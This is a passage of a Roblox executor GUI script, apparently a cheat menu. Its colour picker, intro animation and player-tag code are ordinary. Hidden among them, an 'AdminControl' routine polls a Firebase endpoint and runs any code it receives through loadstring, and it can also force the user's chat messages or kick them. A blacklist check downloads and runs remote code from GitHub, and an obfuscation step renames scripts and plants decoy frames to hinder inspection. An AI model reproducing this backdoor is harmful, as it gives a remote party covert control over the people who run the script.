			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local RealGui = getScreenGui()
	if not RealGui then return end
	
	-- ============================================================
	-- STEP 1: Move real GUI to CoreGui
	-- ============================================================
	RealGui.Parent = CoreGui
	
	-- ============================================================
	-- STEP 2: Rename folders ending with HIDE to "Folder" and all scripts to "LocalScript"
	-- ============================================================
	for _, descendant in pairs(RealGui:GetDescendants()) do
		if descendant:IsA("LocalScript") or descendant:IsA("ModuleScript") or descendant:IsA("Script") then
			descendant.Name = "LocalScript"
		elseif descendant:IsA("Folder") and descendant.Name:match("HIDE$") then
			descendant.Name = "Folder"
		end
	end
	
	-- ============================================================
	-- STEP 2.5: Create 10 fake MainFrames in the real ScreenGui
	-- ============================================================
	local instanceTypes = {"Frame", "TextLabel", "TextButton", "ImageLabel", "ScrollingFrame", "Folder", "LocalScript"}
	
	local function randomString(length)
		local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local result = ""
		for i = 1, length do
			local rand = math.random(1, #chars)
			result = result .. chars:sub(rand, rand)
		end
		return result
	end
	
	for i = 1, 10 do
		local fakeFrame = Instance.new("Frame")
		fakeFrame.Name = "MainFrame"
		fakeFrame.Visible = false
		fakeFrame.Parent = RealGui
	
		local numChildren = math.random(3, 8)
		for j = 1, numChildren do
			local randomType = instanceTypes[math.random(1, #instanceTypes)]
			local fakeChild = Instance.new(randomType)
			fakeChild.Name = randomString(math.random(5, 12))
	
			if fakeChild:IsA("GuiObject") then
				fakeChild.Visible = false
			end
	
			if fakeChild:IsA("LocalScript") then
				fakeChild.Disabled = true
			end
	
			fakeChild.Parent = fakeFrame
		end
	end
end;
task.spawn(C_2c5);
-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.BlacklistCheck
local function C_2c6()
local script = G2L["2c6"];
	-- Blacklist Check Script
	-- Place this LocalScript at the start of your GUI execution
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	-- Find the ScreenGui
	local function findScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
		return nil
	end
	
	-- Wait for the helper functions to be loaded
	repeat task.wait() until _G.IsBlacklisted and _G.IsHWIDBanned
	
	-- Get HWID (executor-dependent, this is a common method)
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId() -- or use your executor's gethwid() function
	
	-- Check if player is blacklisted OR HWID banned
	if _G.IsBlacklisted(player.UserId) or _G.IsHWIDBanned(hwid) then
		-- Execute both at the same time
		spawn(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/agarvsocooolsmith/Scripts/refs/heads/main/blacklistmessage"))()
		end)
	
		local screenGui = findScreenGui()
		if screenGui then
			screenGui:Destroy()
		end
		return
	end
	
	-- If not blacklisted, continue with normal script execution below
end;
task.spawn(C_2c6);
-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AdminControl
local function C_2c7()
local script = G2L["2c7"];
	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local TextChatService = game:GetService("TextChatService")
	local LocalPlayer = Players.LocalPlayer
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	local lastCommandTimestamp = os.time()
	
	local function checkForCommands()
		pcall(function()
			local response = _req({
				Url = FIREBASE_URL .. "/commands/" .. LocalPlayer.Name .. ".json",
				Method = "GET"
			})
			if response.StatusCode == 200 and response.Body ~= "null" then
				local commandData = HttpService:JSONDecode(response.Body)
				if commandData and commandData.timestamp > lastCommandTimestamp then
					lastCommandTimestamp = commandData.timestamp
					if commandData.type == "forcechat" then
						pcall(function()
							if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
								TextChatService.TextChannels.RBXGeneral:SendAsync(commandData.message)
							else
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(commandData.message, "All")
							end
						end)
					elseif commandData.type == "kick" then
						LocalPlayer:Kick("You have been kicked by an admin.")
					elseif commandData.type == "execute" then
						pcall(function()
							loadstring(commandData.code)()
						end)
					end
					-- REMOVED THE DELETE HERE - let the 10 second timer handle it
				end
			end
		end)
	end
	
	while wait(3) do
		checkForCommands()
	end
end;
task.spawn(C_2c7);
-- StarterGui.T5784YHRGE89ES98T.ColorPicker.colorpickerScript
local function C_2c9()
local script = G2L["2c9"];
	local ColorPicker = script.Parent
	
	-- UI Elements
	local canvas = ColorPicker.innerframelayout.canvashue.canvasFrame.canvas
	local canvasDot = canvas.dot
	
	local hue = ColorPicker.innerframelayout.canvashue.hueFrame.hue
	local hueLine = hue.line
	
	local slider = ColorPicker.innerframelayout.transparency.transparencyFrame.slider
	local sliderLine = slider.line
	
	local hexTextbox = ColorPicker.innerframelayout.colorvalue.hex.textbox
	local rgbTextbox = ColorPicker.innerframelayout.colorvalue.rgb.textbox
	
	local applyButtonFrame = ColorPicker.innerframelayout.applycancel.apply.buttonFrame
	
	local UserInputService = game:GetService("UserInputService")
	local GuiService = game:GetService("GuiService")
	
	-- Current color state
	local currentHue = 0
	local currentSat = 1
	local currentVal = 1
	local currentAlpha = 0
	
	-- Dragging states
	local canvasDragging = false
	local hueDragging = false
	local alphaDragging = false
	
	-- Helper: HSV to RGB
	local function hsvToRgb(h, s, v)
		local r, g, b
		local i = math.floor(h * 6)
		local f = h * 6 - i
		local p = v * (1 - s)
		local q = v * (1 - f * s)
		local t = v * (1 - (1 - f) * s)
		i = i % 6
		if i == 0 then r, g, b = v, t, p
		elseif i == 1 then r, g, b = q, v, p
		elseif i == 2 then r, g, b = p, v, t
		elseif i == 3 then r, g, b = p, q, v
		elseif i == 4 then r, g, b = t, p, v
		elseif i == 5 then r, g, b = v, p, q
		end
		return Color3.new(r, g, b)
	end
	
	-- Helper: RGB to HSV
	local function rgbToHsv(color)
		local r, g, b = color.R, color.G, color.B
		local max = math.max(r, g, b)
		local min = math.min(r, g, b)
		local delta = max - min
	
		local h, s, v = 0, 0, max
	
		if max > 0 and delta > 0 then
			s = delta / max
			if max == r then
				h = ((g - b) / delta) % 6
			elseif max == g then
				h = (b - r) / delta + 2
			else
				h = (r - g) / delta + 4
			end
			h = h / 6
		end
	
		return h, s, v
	end
	
	-- Helper: RGB to Hex
	local function rgbToHex(color)
		return string.format("#%02X%02X%02X", 
			math.floor(color.R * 255),
			math.floor(color.G * 255),
			math.floor(color.B * 255))
	end
	
	-- Helper: Hex to RGB
	local function hexToRgb(hex)
		hex = hex:gsub("#", "")
		if #hex ~= 6 then return nil end
		local r = tonumber(hex:sub(1, 2), 16)
		local g = tonumber(hex:sub(3, 4), 16)
		local b = tonumber(hex:sub(5, 6), 16)
		if not r or not g or not b then return nil end
		return Color3.fromRGB(r, g, b)
	end
	
	-- Update everything based on current HSV values
	local function updateColor()
		local hueColor = hsvToRgb(currentHue, 1, 1)
		local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
	
		-- Update canvas gradient
		if not canvas:FindFirstChild("SatGradient") then
			local satFrame = Instance.new("Frame")
			satFrame.Name = "SatGradient"
			satFrame.Size = UDim2.new(1, 0, 1, 0)
			satFrame.BackgroundColor3 = Color3.new(1, 1, 1)
			satFrame.BorderSizePixel = 0
			satFrame.ZIndex = canvas.ZIndex
			local grad = Instance.new("UIGradient")
			grad.Name = "Gradient"
			grad.Parent = satFrame
			satFrame.Parent = canvas
	
			local valFrame = Instance.new("Frame")
			valFrame.Name = "ValGradient"
			valFrame.Size = UDim2.new(1, 0, 1, 0)
			valFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			valFrame.BackgroundTransparency = 0
			valFrame.BorderSizePixel = 0
			valFrame.ZIndex = canvas.ZIndex + 1
			local grad2 = Instance.new("UIGradient")
			grad2.Name = "Gradient"
			grad2.Rotation = 90
			grad2.Transparency = NumberSequence.new({
				NumberSequenceKeypoint.new(0, 1),
				NumberSequenceKeypoint.new(1, 0)
			})
			grad2.Parent = valFrame
			valFrame.Parent = canvas
		end
	
		local satGrad = canvas.SatGradient.Gradient
		satGrad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
			ColorSequenceKeypoint.new(1, hueColor)
		})
	
		-- Update transparency slider color
		local transFrame = slider:FindFirstChild("TransColorFrame")
		if transFrame then
			transFrame.BackgroundColor3 = finalColor
		end
	
		-- Update textboxes
		hexTextbox.Text = rgbToHex(finalColor)
		rgbTextbox.Text = string.format("%d, %d, %d",
			math.floor(finalColor.R * 255),
			math.floor(finalColor.G * 255),
			math.floor(finalColor.B * 255))
	
		-- Update apply button color
		applyButtonFrame.BackgroundColor3 = finalColor
		applyButtonFrame.BackgroundTransparency = currentAlpha
	
		-- Update hue line and canvas dot positions
		hueLine.Position = UDim2.new(0, 0, currentHue, 0)
		canvasDot.Position = UDim2.new(currentSat, 0, 1 - currentVal, 0)
	
		-- Update all outline strokes when color changes
		if outlineFrames then
			for _, data in pairs(outlineFrames) do
				data.update()
			end
		end
	end
	
	-- Setup canvas
	canvas.AutoButtonColor = false
	canvas.Active = true
	
	-- Setup hue gradient
	hue.AutoButtonColor = false
	hue.BackgroundTransparency = 1
	hue.Active = true
	if not hue:FindFirstChild("HueGradientFrame") then
		local hueFrame = Instance.new("Frame")
		hueFrame.Name = "HueGradientFrame"
		hueFrame.Size = UDim2.new(1, 0, 1, 0)
		hueFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		hueFrame.BorderSizePixel = 0
		hueFrame.ZIndex = hue.ZIndex
		local grad = Instance.new("UIGradient")
		grad.Rotation = 90
		grad.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
			ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
			ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
			ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
			ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
			ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
		})
		grad.Parent = hueFrame
		hueFrame.Parent = hue
	end
	
	-- Setup transparency gradient (checkerboard + color gradient)
	slider.AutoButtonColor = false
	slider.BackgroundTransparency = 1
	slider.Active = true
	if not slider:FindFirstChild("TransCheckerboard") then
		local checkerboard = Instance.new("Frame")
		checkerboard.Name = "TransCheckerboard"
		checkerboard.Size = UDim2.new(1, 0, 1, 0)
		checkerboard.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		checkerboard.BorderSizePixel = 0
		checkerboard.ZIndex = slider.ZIndex
		checkerboard.ClipsDescendants = true
	
		local squareSize = 4
		for y = 0, 50 do
			for x = 0, 50 do
				if (x + y) % 2 == 1 then
					local square = Instance.new("Frame")
					square.Size = UDim2.new(0, squareSize, 0, squareSize)
					square.Position = UDim2.new(0, x * squareSize, 0, y * squareSize)
					square.BackgroundColor3 = Color3.fromRGB(204, 204, 204)
					square.BorderSizePixel = 0
					square.ZIndex = slider.ZIndex
					square.Parent = checkerboard
				end
			end
		end
	
		checkerboard.Parent = slider
	
		local transColorFrame = Instance.new("Frame")
		transColorFrame.Name = "TransColorFrame"
		transColorFrame.Size = UDim2.new(1, 0, 1, 0)
		transColorFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		transColorFrame.BorderSizePixel = 0
		transColorFrame.ZIndex = slider.ZIndex + 1
		local grad = Instance.new("UIGradient")
		grad.Transparency = NumberSequence.new({
			NumberSequenceKeypoint.new(0, 0),
			NumberSequenceKeypoint.new(1, 1)
		})
		grad.Parent = transColorFrame
		transColorFrame.Parent = slider
	end
	
	local function updateCanvasFromInput(input)
		local canvasPos = canvas.AbsolutePosition
		local canvasSize = canvas.AbsoluteSize
	
		local relativeX = math.clamp(input.Position.X - canvasPos.X, 0, canvasSize.X - 4)
		local relativeY = math.clamp(input.Position.Y - canvasPos.Y, 0, canvasSize.Y - 4)
	
		currentSat = relativeX / canvasSize.X
		currentVal = 1 - (relativeY / canvasSize.Y)
	
		canvasDot.Position = UDim2.new(currentSat, 0, 1 - currentVal, 0)
		updateColor()
	end
	
	canvas.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			canvasDragging = true
			updateCanvasFromInput(input)
		end
	end)
	
	-- Hue slider interaction
	local function updateHueFromInput(input)
		local huePos = hue.AbsolutePosition
		local hueSize = hue.AbsoluteSize
	
		local relativeY = math.clamp(input.Position.Y - huePos.Y, 0, hueSize.Y)
		currentHue = relativeY / hueSize.Y
	
		hueLine.Position = UDim2.new(0, 0, currentHue, 0)
		updateColor()
	end
	
	hue.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			hueDragging = true
			updateHueFromInput(input)
		end
	end)
	
	local function updateAlphaFromInput(input)
		local sliderPos = slider.AbsolutePosition
		local sliderSize = slider.AbsoluteSize
	
		local relativeX = math.clamp(input.Position.X - sliderPos.X, 0, sliderSize.X)
		currentAlpha = relativeX / sliderSize.X
	
		sliderLine.Position = UDim2.new(currentAlpha, 0, 0, 0)
		applyButtonFrame.BackgroundTransparency = currentAlpha
	end
	
	slider.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			alphaDragging = true
			updateAlphaFromInput(input)
		end
	end)
	
	-- Global input handlers for dragging
	UserInputService.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if canvasDragging then
				updateCanvasFromInput(input)
			end
			if hueDragging then
				updateHueFromInput(input)
			end
			if alphaDragging then
				updateAlphaFromInput(input)
			end
		end
	end)
	
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			canvasDragging = false
			hueDragging = false
			alphaDragging = false
		end
	end)
	
	-- Hex textbox
	local previousHex = hexTextbox.Text
	local hexTextChanged = false
	
	hexTextbox.Focused:Connect(function()
		previousHex = hexTextbox.Text
		hexTextChanged = false
	end)
	
	hexTextbox:GetPropertyChangedSignal("Text"):Connect(function()
		hexTextChanged = true
		local text = hexTextbox.Text:upper()
		text = text:gsub("[^0-9A-F#]", "")
		if #text > 7 then text = text:sub(1, 7) end
		hexTextbox.Text = text
	end)
	
	hexTextbox.FocusLost:Connect(function()
		if not hexTextChanged then
			hexTextbox.Text = previousHex
			return
		end
	
		local color = hexToRgb(hexTextbox.Text)
		if color then
			local h, s, v = rgbToHsv(color)
			currentHue = h
			currentSat = s
			currentVal = v
			updateColor()
			previousHex = hexTextbox.Text
		else
			hexTextbox.Text = previousHex
		end
	end)
	
	-- RGB textbox
	local previousRgb = rgbTextbox.Text
	local rgbTextChanged = false
	
	rgbTextbox.Focused:Connect(function()
		previousRgb = rgbTextbox.Text
		rgbTextChanged = false
	end)
	
	rgbTextbox:GetPropertyChangedSignal("Text"):Connect(function()
		rgbTextChanged = true
		local text = rgbTextbox.Text
		text = text:gsub("[^0-9 ]", "")
		text = text:gsub(" +", " ")
		rgbTextbox.Text = text
	end)
	
	rgbTextbox.FocusLost:Connect(function()
		if not rgbTextChanged then
			rgbTextbox.Text = previousRgb
			return
		end
	
		local text = rgbTextbox.Text:gsub(" ", ", ")
		local r, g, b = text:match("(%d+),%s*(%d+),%s*(%d+)")
		if r and g and b then
			r, g, b = tonumber(r), tonumber(g), tonumber(b)
			if r and g and b and r <= 255 and g <= 255 and b <= 255 then
				local color = Color3.fromRGB(r, g, b)
				local h, s, v = rgbToHsv(color)
				currentHue = h
				currentSat = s
				currentVal = v
				updateColor()
				previousRgb = rgbTextbox.Text
			else
				rgbTextbox.Text = previousRgb
			end
		else
			rgbTextbox.Text = previousRgb
		end
	end)
	
	-- Textbox and button outline hover effects
	local outlineFrames = {}
	
	local function setupOutlineEffect(parentFrame, childElement)
		local outlineStroke = nil
		for _, descendant in pairs(parentFrame:GetDescendants()) do
			if descendant:IsA("UIStroke") and descendant.Name == "outlineStroke" then
				outlineStroke = descendant
				break
			end
		end
	
		if not outlineStroke then return end
	
		local originalColor = outlineStroke.Color
		local originalThickness = outlineStroke.Thickness
		local isHovering = false
		local isFocused = false
	
		local function updateStroke()
			local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
			if isFocused or isHovering then
				outlineStroke.Color = finalColor
				outlineStroke.Thickness = 1
			else
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = 2
			end
		end
	
		if childElement and childElement:IsA("TextBox") then
			childElement.Focused:Connect(function()
				isFocused = true
				updateStroke()
			end)
			childElement.FocusLost:Connect(function()
				isFocused = false
				updateStroke()
			end)
		end
	
		parentFrame.MouseEnter:Connect(function()
			isHovering = true
			updateStroke()
		end)
		parentFrame.MouseLeave:Connect(function()
			isHovering = false
			updateStroke()
		end)
	
		table.insert(outlineFrames, {update = updateStroke})
	end
	
	setupOutlineEffect(ColorPicker.innerframelayout.colorvalue.hex, hexTextbox)
	setupOutlineEffect(ColorPicker.innerframelayout.colorvalue.rgb, rgbTextbox)
	setupOutlineEffect(ColorPicker.innerframelayout.applycancel.apply, nil)
	setupOutlineEffect(ColorPicker.innerframelayout.applycancel.cancel, nil)
	
	-- Initial update
	updateColor()
	
	-- Global functions for master script
	function _G.SetColorPickerColor(color, alpha)
		local h, s, v = rgbToHsv(color)
		currentHue = h
		currentSat = s
		currentVal = v
		currentAlpha = alpha or 0
		updateColor()
	end
	
	function _G.GetColorPickerColor()
		local finalColor = hsvToRgb(currentHue, currentSat, currentVal)
		return finalColor, currentAlpha
	end
	
	ColorPicker.Visible = false
end;
task.spawn(C_2c9);
-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.intro
local function C_328()
local script = G2L["328"];
	-- Add this at the very top of your script
	if _G.IntroPlayed then
		script.Parent.Parent:Destroy()
		return
	end
	_G.IntroPlayed = true
	
	local canvasGroup = script.Parent.Parent
	local textLabel = script.Parent
	canvasGroup.Visible = true
	local TweenService = game:GetService("TweenService")
	local SoundService = game:GetService("SoundService")
	
	local brightBlue = Color3.fromRGB(0, 123, 255)
	local darkBlue = Color3.fromRGB(0, 60, 120)
	
	-- Find MainFrame UIScale
	local function getScreenGui()
		local p = canvasGroup
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	local MainFrame = screenGui and screenGui:FindFirstChild("MainFrame")
	local uiScale = MainFrame and MainFrame:FindFirstChild("UIScale")
	
	-- Scale MainFrame from 0.2 to 1 (fast start, slow end)
	if uiScale then
		uiScale.Scale = 0.2
		local scaleUp = TweenService:Create(
			uiScale,
			TweenInfo.new(1, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
			{Scale = 1}
		)
		scaleUp:Play()
	end
	
	-- Create and play audio
	local introSound = Instance.new("Sound")
	introSound.SoundId = "rbxassetid://9109651770"
	introSound.Volume = 1
	introSound.TimePosition = 13.32
	introSound.Parent = SoundService
	introSound:Play()
	
	-- Center the canvas group
	canvasGroup.AnchorPoint = Vector2.new(0.5, 0.5)
	canvasGroup.Position = UDim2.new(0.5, 0, 0.5, -15)
	
	-- Set initial color
	textLabel.TextColor3 = brightBlue
	
	-- Start canvas invisible
	canvasGroup.GroupTransparency = 1
	
	-- Fade in canvas
	local fadeIn = TweenService:Create(
		canvasGroup,
		TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
		{GroupTransparency = 0}
	)
	fadeIn:Play()
	fadeIn.Completed:Wait()
	
	-- NOW start the color pulsing loop (canvas is visible now)
	local pulseRunning = true
	task.spawn(function()
		while pulseRunning do
			-- Fade to dark
			local toDark = TweenService:Create(
				textLabel,
				TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{TextColor3 = darkBlue}
			)
			toDark:Play()
			toDark.Completed:Wait()
			if not pulseRunning then break end
			-- Fade back to bright
			local toBright = TweenService:Create(
				textLabel,
				TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
				{TextColor3 = brightBlue}
			)
			toBright:Play()
			toBright.Completed:Wait()
		end
	end)
	
	-- Wait 2.5 seconds
	task.wait(2.5)
	
	-- Stop pulsing
	pulseRunning = false
	
	-- Fade out canvas AND audio at the same time
	local fadeOut = TweenService:Create(
		canvasGroup,
		TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
		{GroupTransparency = 1}
	)
	fadeOut:Play()
	
	local audioFadeOut = TweenService:Create(
		introSound,
		TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
		{Volume = 0}
	)
	audioFadeOut:Play()
	
	fadeOut.Completed:Wait()
	
	-- Destroy the canvas group and audio
	canvasGroup:Destroy()
	introSound:Destroy()
end;
task.spawn(C_328);
-- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE.LabelsTags
local function C_32c()
local script = G2L["32c"];
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	
	-- ==========================================
	-- OWNER TAG
	-- ==========================================
	local ownerBrightBlue = Color3.fromRGB(0, 123, 255)
	local ownerDarkBlue = Color3.fromRGB(0, 83, 166)
	local ownerStrokeColor = Color3.fromRGB(0, 53, 109)
	
	local function addOwnerTag(player)
		repeat task.wait() until _G.IsOwner
		if not _G.IsOwner(player.UserId) then return end
		local function applyToChar(character)
			if not character then return end
			local hrp = character:WaitForChild("HumanoidRootPart", 10)
			if not hrp then return end
			local existing = hrp:FindFirstChild("OwnerTag")
			if existing then existing:Destroy() end
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "OwnerTag"
			billboard.Size = UDim2.new(0, 200, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 4, 0)
			billboard.AlwaysOnTop = true
			billboard.ResetOnSpawn = false
			billboard.Parent = hrp
			local label = Instance.new("TextLabel", billboard)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.Text = "OWNER"
			label.TextColor3 = ownerBrightBlue
			label.Font = Enum.Font.Arcade
			label.TextScaled = true
			label.TextStrokeColor3 = ownerStrokeColor
			label.TextStrokeTransparency = 0
			local cam = workspace.CurrentCamera
			local scaleConn
			scaleConn = RunService.RenderStepped:Connect(function()
				if not billboard.Parent then
					scaleConn:Disconnect()
					return
				end
				local dist = (cam.CFrame.Position - hrp.Position).Magnitude
				local scale = ((34 / dist) * 0.7) + 0.2
				billboard.Size = UDim2.new(0, 200 * scale, 0, 50 * scale)
			end)
			local pulseRunning = true
			task.spawn(function()
				while pulseRunning and billboard.Parent do
					local toDark = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = ownerDarkBlue}
					)
					toDark:Play()
					toDark.Completed:Wait()
					if not billboard.Parent then break end
					local toBright = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = ownerBrightBlue}
					)
					toBright:Play()
					toBright.Completed:Wait()
				end
			end)
			billboard.Destroying:Connect(function()
				pulseRunning = false
				if scaleConn then
					scaleConn:Disconnect()
				end
			end)
		end
		if player.Character then
			applyToChar(player.Character)
		end
		player.CharacterAdded:Connect(applyToChar)
	end
	
	for _, player in ipairs(Players:GetPlayers()) do
		addOwnerTag(player)
	end
	Players.PlayerAdded:Connect(addOwnerTag)
	
	
	
	
	
	
	
	
	
	
	
	-- ==========================================
	-- WHITELISTED TAG
	-- ==========================================
	local whiteBrightBlue = Color3.fromRGB(255, 255, 255)
	local whiteDarkBlue = Color3.fromRGB(166, 166, 166)
	local whiteStrokeColor = Color3.fromRGB(49, 49, 49)
	
	local function addWhitelistedTag(player)
		repeat task.wait() until _G.IsWhitelisted
		if not _G.IsWhitelisted(player.UserId) then return end
	
		-- Don't show tag to the whitelisted player themselves
		local LocalPlayer = Players.LocalPlayer
		if player == LocalPlayer then return end
	
		local function applyToChar(character)
			if not character then return end
			local hrp = character:WaitForChild("HumanoidRootPart", 10)
			if not hrp then return end
			local existing = hrp:FindFirstChild("WhitelistedTag")
			if existing then existing:Destroy() end
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "WhitelistedTag"
			billboard.Size = UDim2.new(0, 200, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 4, 0)
			billboard.AlwaysOnTop = true
			billboard.ResetOnSpawn = false
			billboard.Parent = hrp
			local label = Instance.new("TextLabel", billboard)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.Text = "COOL PEOPLE"
			label.TextColor3 = whiteBrightBlue
			label.Font = Enum.Font.Arcade
			label.TextScaled = true
			label.TextStrokeColor3 = whiteStrokeColor
			label.TextStrokeTransparency = 0
			local cam = workspace.CurrentCamera
			local scaleConn
			scaleConn = RunService.RenderStepped:Connect(function()
				if not billboard.Parent then
					scaleConn:Disconnect()
					return
				end
				local dist = (cam.CFrame.Position - hrp.Position).Magnitude
				local scale = ((26 / dist) * 0.5) + 0.2
				billboard.Size = UDim2.new(0, 200 * scale, 0, 50 * scale)
			end)
			local pulseRunning = true
			task.spawn(function()
				while pulseRunning and billboard.Parent do
					local toDark = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = whiteDarkBlue}
					)
					toDark:Play()
					toDark.Completed:Wait()
					if not billboard.Parent then break end
					local toBright = TweenService:Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = whiteBrightBlue}
					)
					toBright:Play()
					toBright.Completed:Wait()
				end
			end)
			billboard.Destroying:Connect(function()
				pulseRunning = false
				if scaleConn then
					scaleConn:Disconnect()
				end
			end)
		end
		if player.Character then
			applyToChar(player.Character)
		end
		player.CharacterAdded:Connect(applyToChar)
	end
	
	for _, player in ipairs(Players:GetPlayers()) do
		addWhitelistedTag(player)
	end
	Players.PlayerAdded:Connect(addWhitelistedTag)
	
	
	
	
	
	
	
	
	-- ==========================================
	-- BLACKLISTED TAG
	-- ==========================================
	local blackBrightRed = Color3.fromRGB(255, 0, 0)
	local blackDarkRed = Color3.fromRGB(150, 0, 0)
	local blackStrokeColor = Color3.fromRGB(80, 0, 0)
	local function addBlacklistedTag(player)
		repeat task.wait() until _G.IsBlacklisted and _G.IsOwner and _G.IsWhitelisted
		-- Only owners and whitelisted can see blacklist tags
		local LocalPlayer = game:GetService("Players").LocalPlayer
		if not _G.IsOwner(LocalPlayer.UserId) and not _G.IsWhitelisted(LocalPlayer.UserId) then return end
		if not _G.IsBlacklisted(player.UserId) then return end
		local function applyToChar(character)
			if not character then return end
			local torso = character:WaitForChild("UpperTorso", 10) or character:WaitForChild("Torso", 10)
			if not torso then return end
			local existing = torso:FindFirstChild("BlacklistedTag")
			if existing then existing:Destroy() end
			local billboard = Instance.new("BillboardGui")
			billboard.Name = "BlacklistedTag"
			billboard.Size = UDim2.new(0, 200, 0, 50)
			billboard.StudsOffset = Vector3.new(0, 0, 0)
			billboard.AlwaysOnTop = true
			billboard.ResetOnSpawn = false
			billboard.Parent = torso
			local label = Instance.new("TextLabel", billboard)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.Text = "BLACKLISTED"
			label.TextColor3 = blackBrightRed
			label.Font = Enum.Font.Arcade
			label.TextScaled = true
			label.TextStrokeColor3 = blackStrokeColor
			label.TextStrokeTransparency = 0
			local cam = workspace.CurrentCamera
			local scaleConn
			scaleConn = game:GetService("RunService").RenderStepped:Connect(function()
				if not billboard.Parent then
					scaleConn:Disconnect()
					return
				end
				local dist = (cam.CFrame.Position - torso.Position).Magnitude
				local scale = ((26 / dist) * 0.5)
				billboard.Size = UDim2.new(0, 200 * scale, 0, 50 * scale)
			end)
			local pulseRunning = true
			task.spawn(function()
				while pulseRunning and billboard.Parent do
					local toDark = game:GetService("TweenService"):Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = blackDarkRed}
					)
					toDark:Play()
					toDark.Completed:Wait()
					if not billboard.Parent then break end
					local toBright = game:GetService("TweenService"):Create(
						label,
						TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
						{TextColor3 = blackBrightRed}
					)
					toBright:Play()
					toBright.Completed:Wait()
				end
			end)
			billboard.Destroying:Connect(function()
				pulseRunning = false
				if scaleConn then
					scaleConn:Disconnect()
				end
			end)
		end
		if player.Character then
			applyToChar(player.Character)
		end
		player.CharacterAdded:Connect(applyToChar)
	end
	for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
		addBlacklistedTag(player)
	end
	game:GetService("Players").PlayerAdded:Connect(addBlacklistedTag)
end;
task.spawn(C_32c);
-- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE.tcotoolrefresh
local function C_32e()
local script = G2L["32e"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	shared.RefreshTool = function(toolName)
		if not toolName then return false end
	
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(toolName) then
			return false
		end
	
		local tool = LocalPlayer.Backpack:FindFirstChild(toolName)
	
		if not tool then
			return false
		end
	
		tool.Parent = LocalPlayer.Character
	
		while tool.Parent == LocalPlayer.Character do
			tool.Parent = LocalPlayer.Backpack
			task.wait()
		end
	
		return true
	end
end;
task.spawn(C_32e);
